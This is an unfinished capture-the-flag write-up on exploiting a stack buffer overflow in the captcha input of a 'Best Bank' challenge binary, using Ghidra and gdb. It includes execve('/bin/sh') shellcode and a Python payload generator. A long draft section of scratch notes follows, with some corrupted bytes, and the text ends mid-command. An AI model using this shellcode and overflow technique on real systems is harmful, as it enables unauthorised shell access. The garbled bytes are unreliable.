# Best Bank

## Pwn: 250 points

## Challenge

The Best Bank has been opened to the public! Perhaps the Best Bank is not as secure as it seems?

`nc challenges.laptophackingcoffee.org 2168`

Credit: Tux#1576

[ [bank](bank) ]

## Solution

### Run the Program

Download the [bank](bank) file and inspect it. The `file` commands shows that the binary is a 32-bit executable and stripped of its debug symbols:
```
$ file bank
bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped
```

Add execute permissions and run the binary. Play around with the options and get a feel for the program:
```
$ chmod +x bank
$ ./bank
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 3
Your current balance is: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 1
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: b3sTbAnK
Correct!

How much would you like to withdraw?: 100
Withdrawal successful!

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 4
```

A few quick notes from the initial run:

1. Entering any number besides 1-4 results in an error message: `That is not a valid choice! Try again.`
2. Entering any non-numeric character results in an infinite loop of the same error message.
3. The deposit and withdraw options require a **Captcha**, which is always the same: **b3sTbAnK**. Even though the captcha is only eight characters long, the function accepts input of much longer length.

### Decompile with Ghidra

Open the binary in Ghidra and analyze the file. In the **Symbol Tree** under **Functions**, click the `entry` function. This function just calls `__libc_start_main` with `FUN_080493dc` as a parameter.
```c
void entry(void)
{
  __libc_start_main(FUN_080493dc);
  ...
}
```

Inspect `FUN_080493dc`. This function shows the bank menu and handles user input. Rename it to `bankMenu` and rename the other variables. This is the result:
```c
void bankMenu(undefined1 param_1)
{
  int selectedOption;
  ...
  puts("Welcome to the Best Bank!");
  puts("Current balance: $500\n");
  do {
    while( true ) {
      while( true ) {
        // If option != deposit then break
        showOptions();
        printf("Enter your choice: ");
        __isoc99_scanf(&optionFormat, &selectedOption);
        if (selectedOption != 2) break;
        deposit();
      }
      // if selectedOption > 2: break
      if (2 < selectedOption) break;
      if (selectedOption == 1) {
        withdraw();
      }
      else {
LAB_080494cb:
        puts("That is not a valid choice! Try again.\n");
      }
    }
    if (selectedOption != 3) {
      if (selectedOption == 4) {
        exit(0);
      }
      goto LAB_080494cb;
    }
    // selectedOption = 3
    checkBalance();
  } while( true );
}
```

From the `bankMenu` function, all other feature-functions get called:
```
showOptions()           shows the options menu
withdraw()              option 1: [1] Withdraw
deposit()               option 2: [2] Deposit 
checkBalance()          option 3: [3] Check Balance
exit(0)                 option 4: [4] Exit
```

Inspect the `deposit` and `withdraw` functions. Both features require a captcha to proceed and this is reflected in the code. Here is the `withdraw` function with the `captcha` check:
```c
void withdraw(void)
{
  uint captchaResult;
  int withdrawAmount [2];
  
  captchaResult = captcha();
  if (captchaResult != 0) {
    printf("How much would you like to withdraw?: ");
    ...
  }
  return;
}
```

Inspect the `captcha` function. The `puts` method prints the **b3sTbAnK** ASCII art to the screen. Then the `__isoc99_scanf` method gets user input and stores it in `userCaptcha`, which is an array of 1000 characters.
```c
uint captcha(void)
{
  int result;
  undefined4 b3sT;
  undefined4 bAnK;
  undefined zero;       // unused var
  char userCaptcha [1000];
  char *captchaImage;   // unused var
  
  b3sT = 0x54733362;    // 54 73 33 62 = Ts3b
  bAnK = 0x4b6e4162;    // 4b 6e 41 62 = KnAb
  zero = 0;
  captchaImage = /* b3sTbAnK ASCII art */ ;
  puts( /* b3sTbAnK ASCII art */ );
  printf("Captcha: ");
  __isoc99_scanf(&captchaFormat,userCaptcha);
  result = strncmp(userCaptcha,(char *)&b3sT,8);
  if (result != 0) {
    puts("Incorrect!\n");
  }
  else {
    puts("Correct!\n");
  }
  return (uint)(result == 0);
}
```

The full decompiled program can be viewed here: [bank.c](bank.c).

### Segmentation Fault

What would happen if more than 1000 characters are sent to the `captcha` method? Build a quick payload file with python:
```
$ python3 -c "print('1 ' + 'A'*1012)"
1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
```

According to [GeeksforGeeks][2], `scanf` "is used to read the input until it encounters a whitespace, newline or End Of File(EOF)." When the `bank` program receives the payload of `1 AAAAAA...`, `scanf` scans the "1" and stops at the space. Then at the next `scanf` call, the function scans the string of "A"s.

Send the payload to the program:
```
$ python3 -c "print('1 ' + 'A'*1012)" > payload
$ ./bank temp < payload
Welcome to the Best Bank!
Current balance: $500
...
Captcha: Incorrect!

Segmentation fault (core dumped)
```

A captcha input of 1012 characters or more results in a segmentation fault. Anything less does not. This 1012 character limit was determined through trial and error.

### Debug with GDB

Find out what caused the segmentation fault. Open the program in gdb. Run the program with the payload:
```
$ env - gdb bank
(gdb) set disassembly-flavor intel
(gdb) run < payload
Starting program: /lhc/Pwn/BestBank/bank < payload
...
Captcha: Incorrect!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Note that the `env -` command removes environment variables, including variables that modify gdb like [gdb-dashboard][3]. This write-up assumes a default gdb environment. However, [gdb-dashboard][3] is **highly recommended**. 

Inspect the registers: 
```
(gdb) info registers
...
ebp            0x41414141	0x41414141
...
eip            0x41414141	0x41414141                  
```

As shown above, the `eip` (instruction pointer) and `ebp` (stack base pointer) registers have been overwritten with `0x41414141`, which is "AAAA" in hex. The payload has successfully overwritten the instruction pointer, which can control the flow of the program.

Examine the instruction pointer:
```
(gdb) x $eip 
0x41414141:	Cannot access memory at address 0x41414141
```

The program cannot access the memory at the overwritten address `0x41414141`, which results in a segmentation fault.

Now take a closer look at what is happening in the program. Set a breakpoint at the `scanf` function:
```
(gdb) info functions scanf
All functions matching regular expression "scanf":

Non-debugging symbols:
0x08049080  __isoc99_scanf@plt

(gdb) break __isoc99_scanf@plt
Breakpoint 1 at 0x8049080
```

Verify the breakpoint was setup correctly:
```
(gdb) info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08049080 <__isoc99_scanf@plt>
```

Define a gdb function called [hook-stop](https://youtu.be/HSlhY4Uy8SA?t=92) that will print the current instruction and the stack when the program hits a breakpoint:
```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/16wx $esp
>end
(gdb) 
```

The two `x` (examine) commands breakdown like this:
```
x/1i $eip       ; examine 1 instruction starting from $eip address
x/16wx $esp     ; examine 16 words in hex starting from $esp address
```

Run the program with the payload. Continue until the captcha appears and the program hits the captcha's `scanf` breakpoint. 
```
(gdb) run < payload
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank < payload
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
0xffffdd7c:	0x08049489	0x0804a137	0xffffdd9c	0xffffdda8
0xffffdd8c:	0x08049464	0x00000001	0xffffde54	0xffffde5c
0xffffdd9c:	0x0804950b	0xffffddc0	0x00000000	0x00000000
0xffffddac:	0xf7df0e81	0xf7fb0000	0xf7fb0000	0x00000000

Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
(gdb) c
Continuing.
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: => 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110

Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
```

Use the `finish` command after the captcha's `scanf` call:
```
(gdb) finish
Run till exit from #0  0x08049080 in __isoc99_scanf@plt ()
=> 0x8049221:	add    esp,0x10
0xffffd950:	0x0804a0f7	0xffffd974	0x00000002	0x080491c1
0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
0x08049221 in ?? ()
```

Note that the `help` function can explain any unfamiliar command like `finish`:
```
(gdb) help finish
Execute until selected stack frame returns.
Usage: finish
Upon return, the value returned is printed and put in the value history.
```

At this point `scanf` has already scanned in the payload of "A"s, which are visible on the stack as `0x41414141`:
```
0xffffd970:	0x004b6e41	0x41414141	0x41414141	0x41414141
0xffffd980:	0x41414141	0x41414141	0x41414141	0x41414141
```

Now that `scanf` has completed, the program returned back to the `captcha` function. Examine about 30 instructions starting from the current instruction.
```
(gdb) x/30i $eip
=> 0x8049221:	add    esp,0x10
   0x8049224:	sub    esp,0x4
   0x8049227:	push   0x8
   0x8049229:	lea    eax,[ebp-0x3fd]
   0x804922f:	push   eax
   0x8049230:	lea    eax,[ebp-0x3f4]
   0x8049236:	push   eax
   0x8049237:	call   0x8049090 <strncmp@plt>
   0x804923c:	add    esp,0x10
   0x804923f:	test   eax,eax
   0x8049241:	jne    0x804925c
   0x8049243:	sub    esp,0xc
   0x8049246:	lea    eax,[ebx-0x1f06]
   0x804924c:	push   eax
   0x804924d:	call   0x8049050 <puts@plt>
   0x8049252:	add    esp,0x10
   0x8049255:	mov    eax,0x1
   0x804925a:	jmp    0x8049273
   0x804925c:	sub    esp,0xc
   0x804925f:	lea    eax,[ebx-0x1efc]
   0x8049265:	push   eax
   0x8049266:	call   0x8049050 <puts@plt>
   0x804926b:	add    esp,0x10
   0x804926e:	mov    eax,0x0
   0x8049273:	mov    ebx,DWORD PTR [ebp-0x4]
   0x8049276:	leave  
   0x8049277:	ret    
   0x8049278:	push   ebp
   0x8049279:	mov    ebp,esp
   0x804927b:	push   ebx  
```

Notice that these instructions match with the `captcha` function in [bank.c](bank.c):
```
Assembly                                        bank.c
==========================                      ==========================
0x8049237:	call   0x8049090 <strncmp@plt>      strncmp(userCaptcha,(char *)&b3sT,8);
0x8049241:	jne    0x804925c                    if (result != 0)
0x804924d:	call   0x8049050 <puts@plt>         puts("Correct!\n");
0x8049266:	call   0x8049050 <puts@plt>         puts("Incorrect!\n");
```
| Assembly               | bank.c  |
| :----------------------------- | :------- |
| `0x8049237:	call   0x8049090 <strncmp@plt>` | `strncmp(userCaptcha,(char *)&b3sT,8);`
| `0x8049241:	jne    0x804925c` | `if (result != 0)`
| `0x804924d:	call   0x8049050 <puts@plt>` | `puts("Correct!\n");`
| `0x8049266:	call   0x8049050 <puts@plt>` | `puts("Incorrect!\n");`

Set a breakpoint at the `leave` instruction:
```
(gdb) break *0x8049276
Breakpoint 2 at 0x8049276
```

Note that [leave][6] is equivalent to:
```
mov  esp,ebp     # set stack pointer $esp to equal the base pointer $ebp
pop  ebp         # pop top value of stack and store into $ebp
```

And [ret][7] is equivalent to:
```
pop ecx         # pop top of the stack and store it in $ecx
jmp ecx         # jump to $ecx
```

Verify the offset that the $eip is written to. Modify the payload so that the last four bytes are "BBBB". Then run the payload with gdb:
```
$ python3 -c "print('1 ' + 'A'*1008 + 'BBBB')" > payload
$ gdb bank
```

### Exploit Version 1

At this point, it's tempting to write shell code to the stack and jump to the shell code address per the instructions in [LiveOverflow's video][4]. Give this approach a try. 

First find a good address to return to. Open up gdb. 

Use the shell code LiveOverflow suggested by [Shell Storm: Linux x86 execve("/bin/sh")][5]:
```
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\1bx31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

Create the payload with a [python](exploit1.py) script:
```python
#!/usr/bin/python3
import struct

eip = struct.pack("I", 0xdeadbeef)
shellcode =  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\1bx31\xc0\x40\xcd\x80'
payload = b'A' * 1008 + eip + shellcode

with open("payload", "wb") as handle:
    handle.write(payload)
```

# TODO
TODO: remove all /zionperez/ folder names
## Draft Section
```
$ checksec bank
[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ pidof bank
zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ pidof bank
16264
zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat proc/16264/maps
cat: proc/16264/maps: No such file or directory
zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat proc/
cat: proc/: No such file or directory
zionperez@zionperez-Z170X-UD3:~/Desktop/playgrounds/lhc/Pwn/BestBank$ cat /proc/16264/maps
08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
f7d0c000-f7ee1000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7ee1000-f7ee2000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7ee2000-f7ee4000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
f7ee4000-f7ee5000 rwxp 001d7000 fd:01 8130741                            /lib/i]linux-gnu/libc-2.27.so
f7ee5000-f7ee8000 rwxp 00000000 00:00 0 
f7f04000-f7f06000 rwxp 00000000 00:00 0 
f7f06000-f7f09000 r--p 00000000 00:00 0                                  [vvar]
f7f09000-f7f0a000 r-xp 00000000 00:00 0                                  [vdso]
f7f0a000-f7f30000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
f7f30000-f7f31000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
f7f31000-f7f32000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
ffc2d000-ffc4e000 rwxp 00000000 00:00 0                                  [stack]
```

On further research, the `scanf` function appears to be vulnerable to overflow attacks. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 

Important breakpoints:
```
>>> info breakpoints
Num     Type           Disp Enb Address         What
1       breakpoint     keep y   0x08049070      <__libc_start_main@plt>
2       breakpoint     keep y   0x08049276      leave ; ret of captcha function 
3       breakpoint     keep y   0x08049040      <printf@plt>
5       breakpoint     keep y   0x08049080      <__isoc99_scanf@plt>
8       breakpoint     keep y   0x08049208      captcha: instruction after printf
```


```
https://stackoverflow.com/questions/16376341/isoc99-scanf-and-scanf
__isoc99_scanf and scanf
```

```
captchaImage = 
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\


 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
```


```
(gdb) starti


https://gcc.gnu.org/onlinedocs/gcc/Debugging-Options.html
compile with debug symbols
$ gcc -ggdb scanf.c -o scan

$ gcc -ggdb -fno-stack-protector scanf.c -o scan
```
https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb

https://www.youtube.com/watch?v=HSlhY4Uy8SA

```
to get a good return address for the $rsp run program again, si after the ret
and look at the $rsp address.
```

7.2 Example Debugging Session: Segmentation Fault Example
http://www.unknownroad.com/rtfm/gdbtut/gdbsegfault.html



https://stackoverflow.com/questions/10712972/what-is-the-use-of-fno-stack-protector


```
$ gcc -z execstack -ggdb -fno-stack-protector scanf.c -o scan
```
https://stackoverflow.com/questions/29272431/how-to-make-the-stack-of-a-c-program-executable

```
Enter a letter: AAAABBBBCCCCDDDD    # AAAABBBBCCCCDDDD = 41414141 42424242 43434343 44444444
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax                    
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001  # rsp (stack pointer)
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x42414141  #      ...P  ....  A...  BAAA
                  3 2 1 0     7 6 5 4     b a 9 8     f e d c   # little endian    ^
                  ^                       | ^                                      letter variable
                  buffer[0]               ^ buffer[7]                                            
                                          letter variable (0x41 = A)
0x7fffffffde70:	0x43424242	0x44434343	0x00444444	0x00007fff  # rbp: CBBB  DCCC  .DDD  ....
                  3 2 1 0     7 6 5 4     b a 9 8     f e d c   # little endian
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff

>>> x $rsp
0x7fffffffde50:	0xffffdf58  # stack pointer
>>> x $rbp
0x7fffffffde70:	0x43424242  # base pointer. 0x43424242 = CBBB
>>> x letter                
0x7fffffffde6b:	0x41414141  # char letter[1];
>>> x buffer                
0x7fffffffde63:	0x007fffff  # char buffer[8]
>>> x/1bx 0x7fffffffde60
0x7fffffffde60:	0x50        # little endian
```

ABCD
```
Enter a letter: ABCD
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x00444342
0x7fffffffde70:	0x55554710	0x00005555	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff
```

ABCDEFGHIJK
```
Enter a letter: ABCDEFGHIJK
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x45444342
0x7fffffffde70:	0x49484746	0x00004b4a	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff
```

Full alphabet
```
Enter a letter: ABCDEFGHIJKLMNOPQRSTUVWXYZ
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x45444342
0x7fffffffde70:	0x49484746	0x4d4c4b4a	0x51504f4e	0x55545352
0x7fffffffde80:	0x59585756	0x0000005a	0xffffdf58	0x00007fff
```

ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
```
Enter a letter: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x45444342
0x7fffffffde70:	0x49484746	0x4d4c4b4a	0x51504f4e	0x55545352
0x7fffffffde80:	0x59585756	0x6362615a	0x67666564	0x6b6a6968
```

```
=> 0x555555554702 <main+88>:	leave  
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x00000001
0x7fffffffde70:	0x43424242	0x44434343	0xffffde9c	0xcccccccc
0x7fffffffde80:	0x00000000	0x00000000	0xffffdf58	0x00007fff
rbp 0x00007fffffffde70   rsp 0x00007fffffffde50

```
https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
leave is exactly equivalent to:
```
mov  rsp,rbp     # rsp = rbp
pop  rbp         # pop top value of stack (whatever rsp is pointing to) and store into ebp

                 # before: rbp 0x00007fffffffde70   rsp 0x00007fffffffde50
                 # move rsp, rbp ==> rsp = 0x00007fffffffde70
                 # pop rbp ==> rsp pointing to: 
                 # after:  rbp 0x4443434343424242   rsp: 0x00007fffffffde70 + 8
```


```
>>> si
=> 0x555555554703 <main+89>:	ret    
0x7fffffffde78:	0xffffde9c	0xcccccccc	0x00000000	0x00000000
0x7fffffffde88:	0xffffdf58	0x00007fff	0x00008000	0x00000001
0x7fffffffde98:	0x555546aa	0x00005555	0x00000000	0x00000000
0x7fffffffdea8:	0x2b9729c6	0x7267666e	0x555545a0	0x00005555
rbp 0x4443434343424242   rsp 0x00007fffffffde78
```


test.c
```
=> 0x55555555466d <main+32>:	call   0x55555555463a <myFunction>
0x7fffffffde60:	0xffffdf58	0x00007fff	0x00000000	0x00000001
0x7fffffffde70:	0x55554680	0x00005555	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff
0x7fffffffde90:	0x00008000	0x00000001	0x5555464d	0x00005555
rbp 0x00007fffffffde70   rsp 0x00007fffffffde60

=> 0x55555555463a <myFunction>:	push   rbp
0x7fffffffde58:	0x55554672	0x00005555	0xffffdf58	0x00007fff
0x7fffffffde68:	0x00000000	0x00000001	0x55554680	0x00005555
0x7fffffffde78:	0xf7a05b97	0x00007fff	0x00000001	0x00000000
0x7fffffffde88:	0xffffdf58	0x00007fff	0x00008000	0x00000001
rbp 0x00007fffffffde70   rsp 0x00007fffffffde58
>>> x $rbp
0x7fffffffde70:	0x55554680

# full rbp value is: 0x 00007fff ffffde70
# the push rbp function pushes the first 32bits onto the stack first: 00007fff
# then it pushes the last 32 bits: ffffde70
# this is a 64bit program!
# so it makes sense that popping does the opposite!

=> 0x55555555463b <myFunction+1>:	mov    rbp,rsp
0x7fffffffde50:	0xffffde70	0x00007fff	0x55554672	0x00005555 
0x7fffffffde60:	0xffffdf58	0x00007fff	0x00000000	0x00000001
0x7fffffffde70:	0x55554680	0x00005555	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff

```
https://stackoverflow.com/questions/4560720/why-does-the-stack-address-grow-towards-decreasing-memory-addresses


```
exploit.py
eip  = struct.pack("I", 0xffffde80) # rsp 0x00007fff ffffde80
eip += struct.pack("I", 0x00007fff)

$ hexdump -C payload 
00000000  41 41 41 41 42 42 42 42  43 43 43 43 44 80 de ff  |AAAABBBBCCCCD...|
00000010  ff ff 7f 00 00 cc cc cc  cc                       |.........|
00000019

Enter a letter: You entered: A
=> 0x555555554703 <main+89>:	ret    
0x7fffffffde78:	0xffffde80	0x00007fff	0xcccccccc	0x00000000
0x7fffffffde88:	0xffffdf58	0x00007fff	0x00008000	0x00000001
0x7fffffffde98:	0x555546aa	0x00005555	0x00000000	0x00000000
0x7fffffffdea8:	0x9d7f6813	0xea45d230	0x555545a0	0x00005555

>>> si
=> 0x7fffffffde80:	int3   
0x7fffffffde80:	0xcccccccc	0x00000000	0xffffdf58	0x00007fff
0x7fffffffde90:	0x00008000	0x00000001	0x555546aa	0x00005555
0x7fffffffdea0:	0x00000000	0x00000000	0x9d7f6813	0xea45d230
0x7fffffffdeb0:	0x555545a0	0x00005555	0xffffdf50	0x00007fff

successfully jumped to the intended instruction int3 (opcode \xCC)
successfully injected and executed an assembly instruction
```

create the payload to inject a shell command
```c
// test2.c
#include <stdlib.h>

int main(int argc, char **argv)
{
    system("/bin/sh");
}

```

found /bin/sh
```
>>> x/s 0x5555555546f4
0x5555555546f4:	"/bin/sh"
>>> x/8wx 0x5555555546f4
0x5555555546f4:	0x6e69622f	0x0068732f	0x3b031b01	0x00000038
                   n i b /       h s /
                ^ add this to payload

CyberChef:
 /  b  i  n  /  s  h
2f 62 69 6e 2f 73 68
```

```
$ file bank
bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped

note the beginning: bank: ELF 32-bit LSB executable
```

https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
to compile with 32 bit:
```
Command: gcc -m32 geek.c -o geek
```

```
$ gcc -m32 -z execstack -ggdb -fno-stack-protector scanf.c -o scan.o
```



```
0x08048065 in _start ()
>>> x/10i $eip
=> 0x8048065 <_start+5>:	mov    al,0xff
   0x8048067 <_start+7>:	sub    al,0xf4
   0x8048069 <_start+9>:	int    0x80
   0x804806b:	add    BYTE PTR [eax],al
   0x804806d:	add    BYTE PTR [eax],al
   0x804806f:	add    BYTE PTR [eax],al
   0x8048071:	add    BYTE PTR [eax],al
   0x8048073:	add    BYTE PTR [eax],al
   0x8048075:	add    BYTE PTR [eax],al
   0x8048077:	add    BYTE PTR [eax],al
>>> x/2wx $eip
0x8048065 <_start+5>:	0xf42cffb0	0x000080cd

* From this we have:

0xf42cffb0	0x80cd

which breaks down to:

ffb0 = mov al, 0xFF
f42c = sub al, 0xF4
80cd = int 0x80
```

Big note: scanf STOPS scanning at null, space, EOF (anything else?), and also stops scanning at 0x0b. So the 0x0b had to be replaced in the exploit.

```
>>> info breakpoints 
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x565555d9 in main at scanf.c:10
2       breakpoint     keep y   0x565555af in main at scanf.c:8
3       breakpoint     keep y   0x565555c8 in main at scanf.c:9
4       breakpoint     keep y   0x565555aa in main at scanf.c:8
	breakpoint already hit 1 time
5       breakpoint     keep y   0xf7e3bc6e <__isoc99_scanf+190>

```


Why not exploit the captcha? Scanf runs until it finds null, space, or EOF. For the exploit to work, program needs to hit the return portion of the program with exploit placed correctly. Captcha has a 1000 char buffer. Possible. But will explore other options.
```
char userCaptcha[1000];
char *captchaImage;

b3sT = 0x54733362;
bAnK = 0x4b6e4162;

__isoc99_scanf(&captchaFormat, userCaptcha);
result = strncmp(userCaptcha, (char *)&b3sT, 8);
```

#Crackme# Reversing Stripped ELF with GDB 64-Bit
https://www.youtube.com/watch?v=pF_prX9ZEHg

```
strings bank
(gdb) disassemble __isoc99_scanf
(gdb) break __isoc99_scanf
(gdb) r
```


You can chain input together by separating arguments with a space. This is because scanf stops scanning when it detects a space.
```
$ ./bank 
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 1 b3sTbAnK 500 3
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: Correct!

How much would you like to withdraw?: Withdrawal successful!

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: Your current balance is: $0
```


```
>>> info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0xf7e3bbb5 <__isoc99_scanf+5>       ; start of scanf
2       breakpoint     keep y   0xf7e3bc6e <__isoc99_scanf+190>     ; ret of scanf
5       breakpoint     keep y   0x08049208                          ; captcha: instruction after printf
6       breakpoint     keep y   0x08049277                          ; ret of captcha function
```

```
$ ./bank < payload              ; payload contains 2000x As
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice:  _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: Incorrect!

Segmentation fault (core dumped)
```$ checksec --file bank
[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
    Arch:     i386-32-little
